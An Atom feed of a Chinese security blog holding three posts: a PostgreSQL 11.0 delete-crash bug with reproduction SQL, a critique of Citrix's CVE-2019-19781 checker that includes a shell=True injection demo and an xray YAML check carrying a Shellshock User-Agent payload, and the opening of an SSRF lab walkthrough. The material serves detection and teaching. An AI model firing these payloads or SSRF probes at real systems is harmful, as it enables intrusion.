<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.6.2">Jekyll</generator><link href="https://strcpy.me/feed/index.xml" rel="self" type="application/atom+xml" /><link href="https://strcpy.me/" rel="alternate" type="text/html" /><updated>2020-10-03T10:37:24+00:00</updated><id>https://strcpy.me/</id><title type="html">virusdefender’s blog (＾－＾)V</title><subtitle> 学而不思则罔，思而不学则殆</subtitle><author><name>virusdefender</name></author><entry><title type="html">PostgreSQL 11.0 删除操作 Segmentation fault 解决方案</title><link href="https://strcpy.me/index.php/archives/798/" rel="alternate" type="text/html" title="PostgreSQL 11.0 删除操作 Segmentation fault 解决方案" /><published>2020-03-24T00:00:01+00:00</published><updated>2020-03-24T00:00:01+00:00</updated><id>https://strcpy.me/index.php/archives/PostgreSQL%2011.0%20%E5%88%A0%E9%99%A4%E6%93%8D%E4%BD%9C%20Segmentation%20fault%20%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88</id><content type="html" xml:base="https://strcpy.me/index.php/archives/798/">&lt;p&gt;此问题在公司内部已经被两个项目组遇到了，表现为在删除操作的时候，PostgreSQL 进程会直接崩溃，服务器日志大概如下&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;2020-03-25 02:30:59.813 UTC [1] LOG:  server process (PID 89) was terminated by signal 11: Segmentation fault
2020-03-25 02:30:59.813 UTC [1] DETAIL:  Failed process was running: DELETE FROM a;
2020-03-25 02:30:59.815 UTC [1] LOG:  terminating any other active server processes
2020-03-25 02:30:59.817 UTC [74] WARNING:  terminating connection because of crash of another server process
2020-03-25 02:30:59.817 UTC [74] DETAIL:  The postmaster has commanded this server process to roll back the current transaction and exit, because another server process exited abnormally and possibly corrupted shared memory.
2020-03-25 02:30:59.817 UTC [74] HINT:  In a moment you should be able to reconnect to the database and repeat your command.
2020-03-25 02:30:59.833 UTC [1] LOG:  all server processes terminated; reinitializing
2020-03-25 02:30:59.861 UTC [91] LOG:  database system was interrupted; last known up at 2020-03-25 02:30:49 UTC
2020-03-25 02:31:00.032 UTC [91] LOG:  database system was not properly shut down; automatic recovery in progress
2020-03-25 02:31:00.036 UTC [91] LOG:  redo starts at 0/1652540
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;解决方案&quot;&gt;解决方案&lt;/h2&gt;

&lt;p&gt;这是 PostgreSQL 的一个 bug，尝试运行&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;VACUUM FULL ANALYZE; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;之后一般可以恢复正常。&lt;/p&gt;

&lt;p&gt;终极解决方案还是升级 PostgreSQL 到 11.x 最新版本，至少是 11.1，小版本升级没兼容性问题，请勿直接升级到 12.x 版本。&lt;/p&gt;

&lt;h2 id=&quot;问题复现方法&quot;&gt;问题复现方法&lt;/h2&gt;

&lt;p&gt;使用 PostgreSQL 11.0 版本，然后执行下面的 sql&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;CREATE TABLE a (
     id bigint
);

INSERT INTO a (id) VALUES (1); 

ALTER TABLE ONLY a ADD CONSTRAINT a_pkey PRIMARY KEY (id);

CREATE TABLE b (
     a_id bigint
);

ALTER TABLE ONLY b ADD CONSTRAINT b_a_id_fkey FOREIGN KEY (a_id) REFERENCES a(id);

ALTER TABLE a ADD x BOOLEAN NOT NULL DEFAULT FALSE; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;再执行 &lt;code class=&quot;highlighter-rouge&quot;&gt;DELETE FROM a;&lt;/code&gt; 的时候就可以复现问题。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root=# DELETE FROM a;
server closed the connection unexpectedly
	This probably means the server terminated abnormally
	before or while processing the request.
The connection to the server was lost. Attempting reset: Failed.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;修复的代码见 &lt;a href=&quot;https://git.postgresql.org/gitweb/?p=postgresql.git&amp;amp;a=commit&amp;amp;h=7636e5c60f&quot;&gt;https://git.postgresql.org/gitweb/?p=postgresql.git&amp;amp;a=commit&amp;amp;h=7636e5c60f&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;邮件列表问题反馈 &lt;a href=&quot;https://www.postgresql.org/message-id/flat/0ff5c33e-43b9-d3e2-9f74-572b694b0ac1%40lab.ntt.co.jp#ff27fe2a4b4c94cde21e56bf69400cae&quot;&gt;https://www.postgresql.org/message-id/flat/0ff5c33e-43b9-d3e2-9f74-572b694b0ac1%40lab.ntt.co.jp#ff27fe2a4b4c94cde21e56bf69400cae&lt;/a&gt;&lt;/p&gt;</content><author><name>virusdefender</name></author><category term="后端" /><summary type="html">此问题在公司内部已经被两个项目组遇到了，表现为在删除操作的时候，PostgreSQL 进程会直接崩溃，服务器日志大概如下</summary></entry><entry><title type="html">安全人员的代码水平</title><link href="https://strcpy.me/index.php/archives/797/" rel="alternate" type="text/html" title="安全人员的代码水平" /><published>2020-01-29T00:00:01+00:00</published><updated>2020-01-29T00:00:01+00:00</updated><id>https://strcpy.me/index.php/archives/%E5%AE%89%E5%85%A8%E4%BA%BA%E5%91%98%E7%9A%84%E4%BB%A3%E7%A0%81%E6%B0%B4%E5%B9%B3</id><content type="html" xml:base="https://strcpy.me/index.php/archives/797/">&lt;p&gt;citrix 官方放了一个 CVE-2019-19781 – Verification Tool，是一个 Python 脚本，链接在 https://support.citrix.com/article/CTX269180。&lt;/p&gt;

&lt;p&gt;为了方便大家看，我保存一个截图。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://storage.virusdefender.net/blog/images/797/poc-img.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;我看了之后觉得槽点满满，不过也符合我一贯的对安全人员代码水平的印象，下面先简单分析下这段代码。&lt;/p&gt;

&lt;h1 id=&quot;代码分析&quot;&gt;代码分析&lt;/h1&gt;

&lt;h2 id=&quot;滥用-globals&quot;&gt;滥用 globals&lt;/h2&gt;

&lt;p&gt;这段代码中，很多 globals 的使用都是不必要的，这种会破坏代码的逻辑结构，而且可能会带来潜在的并发问题。正确的办法应该是在调用方接受函数返回值，然后继续传递给下一个函数。&lt;/p&gt;

&lt;h2 id=&quot;可以使用原生代码的逻辑结果是调用命令&quot;&gt;可以使用原生代码的逻辑结果是调用命令&lt;/h2&gt;

&lt;p&gt;本漏洞是一个目录穿越，只要发送 &lt;code class=&quot;highlighter-rouge&quot;&gt;../&lt;/code&gt; 这种的请求而且穿越成功即可，本来使用 Python urllib 两行的事情，这个人却使用了 &lt;code class=&quot;highlighter-rouge&quot;&gt;curl&lt;/code&gt; 执行命令来检查返回值实现的，这种用法主要有以下缺点&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;新启动进程，耗费资源，降低代码性能&lt;/li&gt;
  &lt;li&gt;潜在的命令注入问题，更何况这里使用了 &lt;code class=&quot;highlighter-rouge&quot;&gt;shell=True&lt;/code&gt; 参数。这个可以借助下面的代码来理解&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &amp;gt;&amp;gt;&amp;gt; subprocess.check_output(&quot;curl http://example.com; expr 1024 + 20480000&quot;, shell=False)
Traceback (most recent call last):
  ......
FileNotFoundError: [Errno 2] No such file or directory: 'curl http://example.com; expr 1024 + 20480000': 'curl http://example.com; expr 1024 + 20480000'


&amp;gt;&amp;gt;&amp;gt; subprocess.check_output(&quot;curl http://example.com; expr 1024 + 20480000&quot;, shell=True)
b'&lt;span class=&quot;cp&quot;&gt;&amp;lt;!doctype html&amp;gt;&lt;/span&gt;\n&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;\n&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;\n    .....&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;\n20481024\n'
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;一个重大逻辑错误&quot;&gt;一个重大逻辑错误&lt;/h2&gt;

&lt;p&gt;如果说上面的问题不影响 poc 的效果的话，下面这个问题是真正的错误了。&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[global]&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;encrypt passwords&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;name resolve order&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;pass&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;根据漏洞原理和代码写法猜测，原作者的意思是 response 中同时含有这三个字符串，但是这里的写法却错误的理解了 Python 的优先级。&lt;/p&gt;

&lt;p&gt;这个代码等价于&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;name resolve order&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;name resolve order&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;只要 response 含有最后一个字符串就会是 &lt;code class=&quot;highlighter-rouge&quot;&gt;True&lt;/code&gt;，实际应该为&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;&quot;str1&quot;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;str2&quot;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这种写法。&lt;/p&gt;

&lt;h2 id=&quot;编码解码的问题&quot;&gt;编码解码的问题&lt;/h2&gt;

&lt;p&gt;还是在这段代码&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[global]&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;encrypt passwords&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;name resolve order&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;pass&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NSIP_RESPONSE_MSG&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;utf-8&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;errors&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ignore&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;pass&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;很多处没必要 bytes 转 string，直接去 bytes 匹配即可，毕竟匹配的都是英文单词，不涉及到解码的问题。&lt;/p&gt;

&lt;p&gt;代码在转换 curl 输出为 string 的时候，上面就看到了两种写法。而查看 Python 的文档，&lt;code class=&quot;highlighter-rouge&quot;&gt;str&lt;/code&gt; 的实现是 &lt;code class=&quot;highlighter-rouge&quot;&gt;class str(object=b'', encoding='utf-8', errors='strict')&lt;/code&gt;，也就是说第二处 &lt;code class=&quot;highlighter-rouge&quot;&gt;errors=&quot;ignore&quot;&lt;/code&gt; 根本没有用处，如果真的发生错误，在 &lt;code class=&quot;highlighter-rouge&quot;&gt;str&lt;/code&gt; 处就异常了。&lt;/p&gt;

&lt;h2 id=&quot;其他的问题&quot;&gt;其他的问题&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;没有必要去 &lt;code class=&quot;highlighter-rouge&quot;&gt;check_valid_host&lt;/code&gt; 捕获 Python 或者 curl 的异常即可，现在的写法需要去解析域名结果，又浪费了性能。&lt;/li&gt;
  &lt;li&gt;读取文件直接使用了 &lt;code class=&quot;highlighter-rouge&quot;&gt;readlines&lt;/code&gt;，而不是 &lt;code class=&quot;highlighter-rouge&quot;&gt;readline&lt;/code&gt;，这样会直接读取整个文件到内存，大文件的时候可能会 oom。&lt;/li&gt;
  &lt;li&gt;结果是最后写入文件的，如果中间代码发生异常，所有的结果就都丢了，如果检测一个写一个，会好一些。&lt;/li&gt;
  &lt;li&gt;没有使用多线程，ip 数量多的时候速度可能会比较慢，但是我估计他们如果使用了多线程，肯定就会有全局变量的竞争问题。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;看完代码之后，感觉就是这是一个安全人员写的代码，因为自己去检测这个漏洞只需要一个 curl 就够了，而讲这个命令转换为 Python 检测代码，这人的想法就是修修补补，比如发请求就去 &lt;code class=&quot;highlighter-rouge&quot;&gt;subprocess&lt;/code&gt; 之前的 curl 就可以了，比如 shell 变量中使用 pipe 或者文件来存储中间结果，现在就直接全局变量。&lt;/p&gt;

&lt;h1 id=&quot;xray-中自定义-poc&quot;&gt;xray 中自定义 poc&lt;/h1&gt;

&lt;p&gt;xray 面临的问题包括&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;团队人手不够，无法短时间完成大量 poc&lt;/li&gt;
  &lt;li&gt;开源 poc 写法五花八门，无法贸然使用&lt;/li&gt;
  &lt;li&gt;xray 由 golang 编写而且不开源，不好实现动态的代码执行&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;所以我们需要一个”静态可拓展“的 poc 框架，让不太懂代码的安全人员也能方便上手来写 poc，而且尽可能的帮助他们避免踩坑，就如同 golang 和 Python 的对比，静态安全又不失灵活。&lt;/p&gt;

&lt;p&gt;这个实现方式包括内置其他语言解释器（Python、Lua、JavaScript）、go plugin 等，但是这些门槛还是有些高，而且存在一些缺点，还有一种方法就是表达式技术，比如 sPEL、OGNL 等。&lt;/p&gt;

&lt;p&gt;我们后续的设计就是基于 yaml 格式去写 poc，使用表达式去判断漏洞，这样可以兼顾静态和动态特性，下面是一个 demo。&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;poc-yaml-bash-cve-2014-6271&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;r1&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;randomInt(800000000, 1000000000)&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;r2&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;randomInt(800000000, 1000000000)&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;rules&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;method&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;GET&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;User-Agent&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;:;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;};&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;echo;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;echo;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/bin/bash&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;-c&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'expr&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;{{r1}}&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;{{r2}}'&quot;&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;follow_redirects&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;false&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;expression&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;response.body.bcontains(bytes(string(r1 + r2)))&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;detail&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;author&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;neal1991(https://github.com/neal1991)&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;links&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;https://github.com/opsxcq/exploit-CVE-2014-6271&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;expression 字段是一个表达式，除了上面的函数，还支持正则、字符串处理等函数，map、括号嵌套等更是基本语法层面的东西，并不是死板简单的正则匹配参数。我们使用的实现是 Google 的 cel 表达式，它是带有类型检查的，有错误根本通不过检查，不会到运行时才报错。同时我们给了 &lt;code class=&quot;highlighter-rouge&quot;&gt;poclint&lt;/code&gt; 工具，类似 &lt;code class=&quot;highlighter-rouge&quot;&gt;go fmt&lt;/code&gt; 帮助你格式化 poc 的代码和检查错误。&lt;/p&gt;

&lt;p&gt;xray 中基于 go http 模块封装了一个 http client，实现了自动重试、代理、自定义 http 头、证书认证等功能，周边功能还包括参数解析和替换重组等等。说实话，我们在里面遇到了很多的坑，因为扫描器请求很多是畸形请求，而 go 的 http client 是很标准的，有些就需要自己去 hack 实现。&lt;/p&gt;

&lt;p&gt;使用 xray 的 poc 不需要关心 http client 的细节，这都是底层架构上实现的，而很多安全的同学写的开源的扫描器全篇都是 &lt;code class=&quot;highlighter-rouge&quot;&gt;requests.get(url)&lt;/code&gt; 这样使用非封装的 http client，根本无法实现全局的设置和统一的错误处理。&lt;/p&gt;

&lt;h1 id=&quot;安全研发&quot;&gt;安全研发&lt;/h1&gt;

&lt;p&gt;如果一个人安全也懂一些，研发也懂一些，那就是符合安全开发这个岗位了，这个岗位在各大公司中主要是做扫描器引擎、WAF/IPS引擎、风控类、网络测绘、内部安全体系建设等等。&lt;/p&gt;

&lt;p&gt;在长亭的这几年，后端和安全开发都做过一些，也面试过很多人，真正让人满意的安全研发是太太太稀缺了，很多安全比较厉害的人，研发就是上面的水平，很多研发还可以的人，是不怎么懂安全的。当然，我一直认为，一个研发大佬学习安全是没太大难度的，最主要的还是缺少安全大佬积累的奇技淫巧、对安全技术的热情等等，这些都阻碍着招聘的进度。一种解决方案是将安全研发拆分为安全研究和研发，安全研究团队负责研究技巧。给出思路和 demo 实现，然后由研发团队去进行产品化的实现。&lt;/p&gt;

&lt;p&gt;长亭科技安全策略和安全研究一直都在招聘，可以点击下面的链接查看，如有意向，可以点击右上角 About 查看我的邮箱然后发送给我简历，这样和直接投递简历比较，好处是我可以帮你预先审核下简历，追踪面试进度，当然最重要的是我可以拿到内推奖金。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://app.mokahr.com/apply/chaitin/4561#/job/c0f360ba-c529-4d9f-8ffc-7bd276019819?_k=21dmp0&quot;&gt;安全策略&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://app.mokahr.com/apply/chaitin/4561#/job/90c3d068-a18c-4a71-83e6-7bf46284e8b7?_k=julier&quot;&gt;安全研究&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><author><name>virusdefender</name></author><category term="安全" /><summary type="html">citrix 官方放了一个 CVE-2019-19781 – Verification Tool，是一个 Python 脚本，链接在 https://support.citrix.com/article/CTX269180。</summary></entry><entry><title type="html">使用 xray 反连平台挖掘和验证 SSRF</title><link href="https://strcpy.me/index.php/archives/796/" rel="alternate" type="text/html" title="使用 xray 反连平台挖掘和验证 SSRF" /><published>2019-10-10T00:00:01+00:00</published><updated>2019-10-10T00:00:01+00:00</updated><id>https://strcpy.me/index.php/archives/%E4%BD%BF%E7%94%A8%20xray%20%E5%8F%8D%E8%BF%9E%E5%B9%B3%E5%8F%B0%E6%8C%96%E6%8E%98%E5%92%8C%E9%AA%8C%E8%AF%81%20SSRF</id><content type="html" xml:base="https://strcpy.me/index.php/archives/796/">&lt;p&gt;SSRF，Server-Side Request Forgery，服务端请求伪造，是一种由攻击者构造形成由服务器端发起请求的一个漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。漏洞形成的原因大多是因为服务端提供了从其他服务器应用获取数据的功能且没有对目标地址作正确的过滤和限制 &lt;a href=&quot;https://ctf-wiki.github.io/ctf-wiki/web/ssrf-zh/&quot;&gt;ref&lt;/a&gt;。&lt;/p&gt;

&lt;h2 id=&quot;目标是什么&quot;&gt;目标是什么&lt;/h2&gt;

&lt;p&gt;在 https://github.com/virusdefender/ssrf-app 提供了一个 ssrf 的实例程序，&lt;code class=&quot;highlighter-rouge&quot;&gt;docker-compose build &amp;amp;&amp;amp; docker-compose up&lt;/code&gt; 之后，浏览器访问 &lt;code class=&quot;highlighter-rouge&quot;&gt;http://vuln.net:8000/?url=http://example.com&lt;/code&gt;，系统就会抓取指定的地址的网页并返回，就可以看到和直接访问 &lt;code class=&quot;highlighter-rouge&quot;&gt;http://example.com&lt;/code&gt; 一样的页面。&lt;/p&gt;

&lt;p&gt;要注意的是，vuln.net 是我绑定的 host 到 docker 容器的 IP，我使用的 docker for mac，ip 为 &lt;code class=&quot;highlighter-rouge&quot;&gt;127.0.0.1&lt;/code&gt;，这其实是经过端口转发的，后端服务器实际并不在我本地，这里可以看实际情况去修改。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://storage.virusdefender.net/blog/images/796/15679032465908.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;另外已知在 &lt;code class=&quot;highlighter-rouge&quot;&gt;/api/internal/secret&lt;/code&gt; 上存放了一个 secret api 服务，目标就是去访问它然后获取 secret，直接访问当然是不行了，会提示 IP 不在允许范围内。&lt;/p&gt;

&lt;p&gt;首先的思路就是使用抓取网页的 api 去访问 secret api，所以先尝试将 &lt;code class=&quot;highlighter-rouge&quot;&gt;url&lt;/code&gt; 参数换成内网 IP，然后访问查看。&lt;/p&gt;

&lt;h2 id=&quot;直接访问-127001-和使用-localhost-域名&quot;&gt;直接访问 127.0.0.1 和使用 localhost 域名&lt;/h2&gt;

&lt;p&gt;第一个尝试的当然是 &lt;code class=&quot;highlighter-rouge&quot;&gt;127.0.0.1&lt;/code&gt;，但是访问 &lt;code class=&quot;highlighter-rouge&quot;&gt;http://vuln.net:8000/?url=http://127.0.0.1:8000&lt;/code&gt; 却提示 &lt;code class=&quot;highlighter-rouge&quot;&gt;127.0.0.1 is forbidden&lt;/code&gt;，尝试使用 &lt;code class=&quot;highlighter-rouge&quot;&gt;localhost&lt;/code&gt; 域名绕过，也是同样的提示，怀疑后端有尝试去解析 ip 然后做验证。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://storage.virusdefender.net/blog/images/796/15679036352485.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://storage.virusdefender.net/blog/images/796/15679036566098.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;尝试扫内网吧&quot;&gt;尝试扫内网吧&lt;/h2&gt;

